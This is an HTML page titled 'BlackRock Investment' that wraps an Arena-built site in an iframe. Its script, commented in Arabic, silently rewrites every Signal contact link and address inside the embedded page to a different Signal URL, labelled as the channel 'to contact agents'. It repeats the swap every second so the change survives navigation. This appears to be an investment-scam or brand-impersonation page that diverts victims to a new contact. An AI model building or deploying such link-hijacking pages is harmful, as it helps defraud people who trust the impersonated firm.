<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>BlackRock Investment</title>
    <meta property="og:type" content="website" />
    <meta property="og:url" content="https://019dd4c9-9670-7a42-a2a0-5ba232f347fb.arena.site/" />
    <meta property="og:title" content="BlackRock Investment" />
    <meta property="og:description" content="Check out what I built in Arena's Code Arena" />
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700&display=swap" rel="stylesheet" />
    
    <style>
      * { margin: 0; padding: 0; box-sizing: border-box; }
      html, body { height: 100%; overflow: hidden; font-family: "Inter", sans-serif; }
      body { display: flex; flex-direction: column; background: #000; }
      .iframe-container { flex: 1; position: relative; background: #000; }
      iframe { position: absolute; top: 0; left: 0; width: 100%; height: 100%; border: none; }
      
      /* تنسيق البانر السفلي ليظهر بشكل احترافي */
      .floating-banner {
        position: fixed;
        bottom: 20px;
        right: 20px;
        background: white;
        border-radius: 12px;
        box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
        z-index: 1000;
        display: flex;
        align-items: center;
        padding: 10px 16px;
        gap: 12px;
      }
      .banner-text-container { display: flex; flex-direction: column; }
      .banner-upper-text { color: #151617; font-size: 13px; font-weight: 700; }
      .banner-lower-text { color: #878c9f; font-size: 10px; }
      .close-btn { cursor: pointer; background: none; border: none; color: #999; margin-left: 10px; }
    </style>
  </head>
  <body>

    <div class="iframe-container">
      <iframe
        id="preview-iframe"
        src="https://019dd4c9-9670-7a42-a2a0-5ba232f347fb.arena.site/?embed=true"
        sandbox="allow-scripts allow-same-origin allow-forms allow-modals allow-popups"
        allow="clipboard-read; clipboard-write;"
      ></iframe>
    </div>

    <div class="floating-banner" id="floating-banner">
      <div class="banner-text-container">
        <p class="banner-upper-text">Built with Arena</p>
        <p class="banner-lower-text">Content is user-generated and unverified</p>
      </div>
      <button class="close-btn" onclick="document.getElementById('floating-banner').style.display='none'">✕</button>
    </div>

    <script>
      // ✅ الرابط الجديد الذي طلبته للتواصل مع الوكلاء
      const NEW_SIGNAL_URL = "https://signal.me/#eu/__kL4ayCt64xdRiSQWwYpMxOo5_u-Br5Y87rLvt7vQ9c0zoJJ3BEHIfxtpSC5JSE";

      const iframe = document.getElementById("preview-iframe");

      // وظيفة ذكية لاستبدال أي روابط أو نصوص قديمة داخل الصفحة
      function injectNewLinks() {
        try {
          const iDoc = iframe.contentDocument || iframe.contentWindow.document;
          if (!iDoc) return;

          // 1. استبدال روابط الأزرار (مثل زر "فتح Signal والتواصل مع الوكلاء")
          const allLinks = iDoc.querySelectorAll('a');
          allLinks.forEach(a => {
            if (a.href.includes("signal.me")) {
              a.href = NEW_SIGNAL_URL;
            }
          });

          // 2. استبدال "النص المكتوب" للرابط القديم الذي يظهر في صفحة الشحن
          const allElements = iDoc.querySelectorAll('*');
          allElements.forEach(el => {
            // إذا كان العنصر يحتوي على نص رابط سيجنال القديم، نستبدله بالجديد
            if (el.children.length === 0 && el.textContent.includes("signal.me/")) {
              el.textContent = NEW_SIGNAL_URL;
            }
          });
        } catch (e) {
          // في حال كانت هناك قيود من المتصفح، سيستمر الموقع بالعمل بشكل طبيعي
        }
      }

      // تشغيل الحقن عند التحميل الأول
      iframe.addEventListener("load", injectNewLinks);

      // تشغيل الحقن بشكل متكرر كل ثانية لضمان تبديل الرابط حتى لو انتقل المستخدم بين الصفحات داخل الموقع
      setInterval(injectNewLinks, 1000);
    </script>

  </body>
</html>
